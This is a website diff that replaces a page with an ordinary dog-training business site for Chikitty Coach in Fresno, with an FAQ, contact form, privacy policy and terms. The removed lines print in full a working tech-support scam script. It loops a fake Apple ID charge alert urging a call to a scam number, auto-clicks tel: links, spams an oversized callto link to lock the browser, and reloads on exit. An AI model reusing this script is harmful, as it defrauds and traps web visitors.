+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12l6 6L20 6"/></svg> Wanting a second opinion before trying group classes</li>
+        </ul>
+      </div>
+    </div>
+  </section>
 
-        var userAgent = window.navigator.userAgent.toLowerCase(),
-            ios = /iphone|ipod|ipad/.test(userAgent);
+  <!-- CTA BANNER -->
+  <section class="cta-banner" style="padding:56px 0;">
+    <div class="wrap cta-inner">
+      <h2>Talk through your dog's situation before you book anything.</h2>
+      <a class="btn" href="tel:+15592226229">Call (559) 222-6229</a>
+    </div>
+  </section>
 
-        function parseURL(url) {
-            var a = document.createElement('a');
-            a.href = url;
-            return a.hostname.replace('www.', '');
-        };
+  <!-- FAQ -->
+  <section id="faq">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Common questions</h2>
+        <p>A few things people usually ask before their first session.</p>
+      </div>
+      <div class="faq-list">
+        <details class="faq-item">
+          <summary class="faq-q">How long does training usually take?<span class="plus">+</span></summary>
+          <div class="faq-a">It depends on the dog and what you're working on. Basic manners often show progress within a handful of sessions; longer-standing behavior issues can take more time. We'll give you a realistic estimate after meeting your dog rather than a fixed number up front.</div>
+        </details>
+        <details class="faq-item">
+          <summary class="faq-q">Do you work with reactive or nervous dogs?<span class="plus">+</span></summary>
+          <div class="faq-a">Yes. We start at whatever distance or setting your dog is comfortable with and work forward from there at their pace. If a case needs veterinary or behavioral specialist involvement, we'll say so directly.</div>
+        </details>
+        <details class="faq-item">
+          <summary class="faq-q">Where do sessions happen?<span class="plus">+</span></summary>
+          <div class="faq-a">Most sessions take place at your home, since that's where the behaviors show up. Some skills are practiced at a quiet nearby location once your dog is ready for it.</div>
+        </details>
+        <details class="faq-item">
+          <summary class="faq-q">How do I book a session?<span class="plus">+</span></summary>
+          <div class="faq-a">Call (559) 222-6229 or send a message through the contact form below. We'll ask a few questions about your dog and get you on the schedule.</div>
+        </details>
+        <details class="faq-item">
+          <summary class="faq-q">What areas do you serve?<span class="plus">+</span></summary>
+          <div class="faq-a">Fresno, CA and the surrounding area. If you're outside that range, call and ask &mdash; we can let you know if a visit is workable.</div>
+        </details>
+      </div>
+    </div>
+  </section>
 
-        function getPar(name) {
-            var url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        };
+  <!-- CONTACT -->
+  <section id="contact">
+    <div class="wrap">
+      <div class="section-head">
+        <h2>Get in touch</h2>
+        <p>Call directly for the fastest response, or send a few details below and we'll get back to you.</p>
+      </div>
+      <div class="contact-grid">
+        <div class="contact-card">
+          <h3>Contact details</h3>
+          <ul class="contact-list">
+            <li>Phone: <a href="tel:+15592226229">(559) 222-6229</a></li>
+            <li>Service area: Fresno, CA and surrounding communities</li>
+            <li>Hours: By appointment, most days of the week</li>
+            <li>Website: chikittycoach.buzz</li>
+          </ul>
+        </div>
+        <form class="contact-form" action="mailto:hello@chikittycoach.buzz" method="post" enctype="text/plain">
+          <div class="field">
+            <label for="name">Your name</label>
+            <input id="name" name="name" type="text" required autocomplete="name">
+          </div>
+          <div class="field">
+            <label for="phone">Phone number</label>
+            <input id="phone" name="phone" type="tel" required autocomplete="tel">
+          </div>
+          <div class="field">
+            <label for="dog">Dog's age and what's going on</label>
+            <textarea id="dog" name="message" required></textarea>
+          </div>
+          <button class="btn" type="submit">Send message</button>
+          <p class="form-note">Sent directly to Chikitty Coach. We don't share your details with anyone else. See our <a href="#privacy">privacy policy</a>.</p>
+        </form>
+      </div>
+    </div>
+  </section>
 
-        window.number = getPar('phone');
+</main>
 
-        window.number = (window.number ? window.number : '+1-877-891-3264');
+<footer>
+  <div class="wrap">
+    <div class="footer-grid">
+      <div>
+        <h4>Chikitty Coach</h4>
+        <p style="max-width:34ch;color:rgba(231,225,209,0.7);">Private dog training for puppies and adult dogs, based in Fresno, CA.</p>
+      </div>
+      <div>
+        <h4>Site</h4>
+        <ul>
+          <li><a href="#services">Training programs</a></li>
+          <li><a href="#process">How it works</a></li>
+          <li><a href="#faq">FAQ</a></li>
+          <li><a href="#contact">Contact</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>Legal</h4>
+        <ul>
+          <li><a href="#privacy">Privacy policy</a></li>
+          <li><a href="#terms">Terms of use</a></li>
+          <li><a href="tel:+15592226229">(559) 222-6229</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2026 Chikitty Coach. All rights reserved.</span>
+      <span>Fresno, CA</span>
+    </div>
+    <p class="disclaimer">Chikitty Coach provides private dog training and behavior support services. Results vary by dog and household and are not guaranteed. This site does not provide veterinary or medical advice; for health concerns, please consult a licensed veterinarian.</p>
+  </div>
+</footer>
 
-        window.device = 'iPhone';
-        window.refef = parseURL(document.referrer);
+<!-- LEGAL: PRIVACY -->
+<section id="privacy" class="legal">
+  <div class="wrap">
+    <h2>Privacy policy</h2>
+    <p>This policy explains what information Chikitty Coach collects through this website and how it is used.</p>
+    <h3>Information we collect</h3>
+    <p>When you use the contact form, we collect the name, phone number, and message you provide. When you call the phone number listed on this site, standard call information may be visible to us through our phone service.</p>
+    <h3>How we use it</h3>
+    <p>We use this information only to respond to your inquiry, schedule sessions, and provide training services you've requested. We do not sell or share your information with third parties for advertising purposes.</p>
+    <h3>Data retention</h3>
+    <p>We keep contact and scheduling information for as long as needed to provide services and for basic business record-keeping, after which it is deleted on request.</p>
+    <h3>Your choices</h3>
+    <p>You can ask us to delete your information at any time by calling (559) 222-6229 or writing to hello@chikittycoach.buzz.</p>
+    <h3>Contact</h3>
+    <p>Questions about this policy can be directed to (559) 222-6229.</p>
+    <a class="back" href="#main">Back to site</a>
+  </div>
+</section>
 
-        if (ios) {
+<!-- LEGAL: TERMS -->
+<section id="terms" class="legal">
+  <div class="wrap">
+    <h2>Terms of use</h2>
+    <p>By using this website, you agree to the following terms.</p>
+    <h3>Services described</h3>
+    <p>Chikitty Coach provides private dog training and behavior support services scheduled by appointment. Descriptions on this site are general in nature; the specific plan for your dog is discussed during your consultation.</p>
+    <h3>No guaranteed outcomes</h3>
+    <p>Training outcomes depend on many factors specific to each dog and household. We do not guarantee a specific result or timeline.</p>
+    <h3>Not veterinary advice</h3>
+    <p>Nothing on this site is a substitute for veterinary or professional medical advice. If your dog shows signs of illness, injury, or sudden behavior change, contact a licensed veterinarian.</p>
+    <h3>Bookings and cancellations</h3>
+    <p>Appointment scheduling, rescheduling, and cancellation details are confirmed directly by phone when you book a session.</p>
+    <h3>Contact</h3>
+    <p>Questions about these terms can be directed to (559) 222-6229.</p>
+    <a class="back" href="#main">Back to site</a>
+  </div>
+</section>
 
-            if (/iphone/.test(userAgent)) {
-                window.device = 'iPhone';
-            }
-
-            if (/ipad/.test(userAgent)) {
-                window.device = 'iPad';
-            }
-
-            if (/ipod/.test(userAgent)) {
-                window.device = 'iPod';
-            }
-        }
-
-        var text = cookieHelper.get('textSetBl');
-        var phone = cookieHelper.get('phoneSetBl');
-
-        function getText() {
-            var str = window.defaultText;
-
-            for (var d in window.text) {
-                if (window.refef.indexOf(d) != -1) {
-                    str = window.text[d];
-                }
-            }
-            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
-            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
-        }
-
-
-        if (!phone) {
-            phone = getURLParameter('phone');
-        }
-        if (!text) {
-            text = getURLParameter('text');
-        }
-
-        var sText = document.querySelectorAll('.js_setTextBlock');
-        for (var t = 0; t < sText.length; t++) {
-            sText[t].innerHTML = getText();
-        }
-        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
-        for (var p = 0; p < sPhone.length; p++) {
-            sPhone[p].innerHTML = phone;
-        }
-
-
-        setInterval(function() {
-            myFunction()
-        }, 100);
-
-        function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-891-3264"></a>');
-            document.querySelector('a').click();
-            var extraData = "";
-            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
-                var extraData = extraData + "5555555555";
-            }
-            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
-        };
-
-        function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-877-891-3264 to Freeze it!.")) {
-                okkkk();
-            } else {
-                okkkk();
-            }
-        }
-
-        window.ununload = function() {
-            debugger;
-            location.reload();
-        }
-    </script>
-
-
-</body>
-
-<!-- Privacy-friendly analytics by Plausible -->
-<script async src="https://plausible.io/js/pa-OA04vxiMjrqR7BVmxbjGu.js"></script>
 <script>
-  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
-  plausible.init()
+  document.getElementById('menuToggle').addEventListener('click', function(){
+    var links = document.querySelector('.nav-links');
+    var expanded = this.getAttribute('aria-expanded') === 'true';
+    this.setAttribute('aria-expanded', String(!expanded));
+    if(links.style.display === 'flex'){
+      links.style.display = 'none';
+    } else {
+      links.style.display = 'flex';
+      links.style.flexDirection = 'column';
+      links.style.position = 'absolute';
+      links.style.top = '64px';
+      links.style.left = '0';
+      links.style.right = '0';
+      links.style.background = 'var(--pine)';
+      links.style.padding = '20px 28px';
+      links.style.gap = '16px';
+    }
+  });
 </script>
 
-
+</body>
 </html>
